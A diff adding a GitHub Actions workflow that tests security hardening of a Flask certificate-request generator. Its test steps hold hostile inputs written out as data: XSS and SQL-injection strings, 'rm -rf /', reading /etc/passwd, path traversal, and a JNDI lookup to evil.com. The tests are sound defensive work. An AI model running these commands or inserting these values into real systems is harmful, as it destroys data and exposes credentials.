@@ -1,0 +1,269 @@
+name: Security Hardening Validation
+
+on:
+  push:
+    branches: [ "master", "main" ]
+  pull_request:
+    branches: [ "master", "main" ]
+    paths:
+      - 'test_security_hardening.py'
+      - 'app.py'
+      - 'csr.py'
+      - 'tests.py'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  security-hardening-tests:
+    name: Security Hardening Test Suite
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version: ["3.9", "3.11"]
+    
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v4
+      with:
+        python-version: ${{ matrix.python-version }}
+    
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt
+        pip install -r requirements-dev.txt
+    
+    - name: Run Security Hardening Tests
+      run: |
+        echo "🔒 Running comprehensive security hardening test suite..."
+        python -m pytest test_security_hardening.py -v --tb=short --disable-warnings
+        echo "✅ Security hardening tests completed"
+    
+    - name: Validate Input Security Tests
+      run: |
+        echo "🔍 Testing input validation security..."
+        python -c "
+        import subprocess
+        import sys
+        
+        # Run specific test classes
+        test_classes = [
+            'test_security_hardening.py::TestInputValidationSecurity',
+            'test_security_hardening.py::TestFileParsingSecurityHardening',
+            'test_security_hardening.py::TestMemoryExhaustionPrevention',
+            'test_security_hardening.py::TestTimingAttackPrevention',
+            'test_security_hardening.py::TestCryptographicSecurityHardening',
+            'test_security_hardening.py::TestLoggingSecurityHardening'
+        ]
+        
+        for test_class in test_classes:
+            print(f'Running {test_class}...')
+            result = subprocess.run(['python', '-m', 'pytest', test_class, '-v'], 
+                                   capture_output=True, text=True)
+            if result.returncode != 0:
+                print(f'❌ {test_class} failed!')
+                print(result.stdout)
+                print(result.stderr)
+                sys.exit(1)
+            else:
+                # Count passed tests
+                passed = result.stdout.count(' PASSED')
+                print(f'✅ {test_class}: {passed} tests passed')
+        
+        print('🔒 All security test categories passed successfully')
+        "
+    
+    - name: Test Attack Vector Coverage
+      run: |
+        echo "🛡️ Validating attack vector coverage..."
+        python -c "
+        # Test various attack vectors are properly handled
+        test_vectors = {
+            'XSS': ['<script>alert(1)</script>', '&lt;script&gt;', 'javascript:'],
+            'SQL_Injection': [\"'; DROP TABLE users; --\", \"1' OR '1'='1\", 'UNION SELECT'],
+            'Command_Injection': ['$(whoami)', '`cat /etc/passwd`', '; rm -rf /'],
+            'Path_Traversal': ['../../../etc/passwd', '..\\\\..\\\\windows\\\\system32'],
+            'LDAP_Injection': ['*)(cn=*', '*)(&(cn=*)(', '(|(cn=*)'],
+            'Buffer_Overflow': ['A' * 10000, 'X' * 50000]
+        }
+        
+        from csr import CsrGenerator
+        import json
+        
+        print('Testing attack vector handling...')
+        for attack_type, payloads in test_vectors.items():
+            print(f'Testing {attack_type} vectors...')
+            for payload in payloads:
+                try:
+                    # Test that malicious payloads are handled safely
+                    test_data = {
+                        'CN': payload,
+                        'C': 'US',
+                        'ST': 'Test',
+                        'L': 'Test',
+                        'O': 'Test'
+                    }
+                    # This should either work safely or throw a controlled exception
+                    csr = CsrGenerator(test_data)
+                    # If it succeeds, ensure no dangerous content is in output
+                    if payload in str(csr.csr) and attack_type == 'XSS':
+                        print(f'❌ Potential {attack_type} vulnerability detected!')
+                        exit(1)
+                except (ValueError, KeyError) as e:
+                    # Expected - input validation working correctly
+                    pass
+                except Exception as e:
+                    # Unexpected error - could indicate vulnerability
+                    print(f'❌ Unexpected error with {attack_type} payload: {e}')
+                    exit(1)
+        
+        print('✅ Attack vector testing completed - all vectors handled safely')
+        "
+    
+    - name: Test Memory and Resource Limits
+      run: |
+        echo "💾 Testing memory and resource limitations..."
+        python -c "
+        import requests
+        import subprocess
+        import time
+        import sys
+        from threading import Thread
+        
+        # Start the Flask app in test mode
+        print('Starting Flask app for resource testing...')
+        process = subprocess.Popen(['python', 'app.py'], 
+                                  stdout=subprocess.PIPE, 
+                                  stderr=subprocess.PIPE)
+        time.sleep(3)  # Give app time to start
+        
+        try:
+            # Test large request handling
+            large_data = {
+                'CN': 'A' * 1000000,  # 1MB of data
+                'C': 'US'
+            }
+            
+            print('Testing large request handling...')
+            response = requests.post('http://localhost:5555/generate', 
+                                   data=large_data, 
+                                   timeout=10)
+            
+            # Should get 413 (Request Entity Too Large) or handle gracefully
+            if response.status_code not in [400, 413, 500]:
+                print(f'❌ Large request not properly limited: {response.status_code}')
+                sys.exit(1)
+            else:
+                print('✅ Large requests properly limited')
+                
+        except requests.exceptions.RequestException as e:
+            print(f'✅ Request properly rejected or timed out: {e}')
+        except Exception as e:
+            print(f'❌ Unexpected error during resource testing: {e}')
+            sys.exit(1)
+        finally:
+            process.terminate()
+            process.wait()
+        
+        print('✅ Memory and resource limit testing completed')
+        "
+    
+    - name: Validate Log Security
+      run: |
+        echo "📝 Testing log security and sanitization..."
+        python -c "
+        from app import sanitize_for_logging
+        
+        # Test log sanitization function
+        test_cases = [
+            ('<script>alert(1)</script>', True),
+            ('Normal text', False),
+            ('${jndi:ldap://evil.com}', True),
+            ('$(whoami)', True),
+            ('Regular domain.com', False),
+            ('\x00\x01\x02', True)  # Control characters
+        ]
+        
+        print('Testing log sanitization...')
+        for test_input, should_be_sanitized in test_cases:
+            sanitized = sanitize_for_logging(test_input)
+            
+            # Check that dangerous content is removed/masked
+            if should_be_sanitized:
+                if test_input == sanitized:
+                    print(f'❌ Log sanitization failed for: {test_input}')
+                    exit(1)
+                else:
+                    print(f'✅ Sanitized: {test_input[:20]}... -> {sanitized[:20]}...')
+            else:
+                if test_input != sanitized:
+                    print(f'⚠️  Safe content was modified: {test_input} -> {sanitized}')
+        
+        print('✅ Log security validation completed')
+        "
+
+  integration-security-test:
+    name: Integration Security Testing
+    runs-on: ubuntu-latest
+    needs: security-hardening-tests
+    
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Set up Python 3.11
+      uses: actions/setup-python@v4
+      with:
+        python-version: "3.11"
+    
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt
+        pip install -r requirements-dev.txt
+    
+    - name: Run Complete Test Suite
+      run: |
+        echo "🧪 Running complete test suite (125 tests)..."
+        python -m pytest tests.py test_security_hardening.py -v --tb=short
+        echo "✅ Complete test suite passed"
+    
+    - name: Generate Security Test Report
+      run: |
+        echo "📊 Generating security test report..."
+        python -c "
+        import subprocess
+        import json
+        from datetime import datetime
+        
+        # Run tests with JSON output
+        result = subprocess.run(['python', '-m', 'pytest', 'test_security_hardening.py', '--tb=short'], 
+                               capture_output=True, text=True)
+        
+        # Count test results
+        output_lines = result.stdout.split('\n')
+        passed_count = sum(1 for line in output_lines if 'PASSED' in line)
+        failed_count = sum(1 for line in output_lines if 'FAILED' in line)
+        
+        report = {
+            'timestamp': datetime.now().isoformat(),
+            'security_tests_passed': passed_count,
+            'security_tests_failed': failed_count,
+            'status': 'PASS' if failed_count == 0 else 'FAIL',
+            'total_security_tests': passed_count + failed_count
+        }
+        
+        print(f'Security Test Report:')
+        print(f'- Security Tests Passed: {report[\"security_tests_passed\"]}')
+        print(f'- Security Tests Failed: {report[\"security_tests_failed\"]}') 
+        print(f'- Overall Status: {report[\"status\"]}')
+        
+        if report['status'] == 'FAIL':
+            print('❌ Security hardening tests failed!')
+            exit(1)
+        else:
+            print('✅ All security hardening tests passed!')
+        "
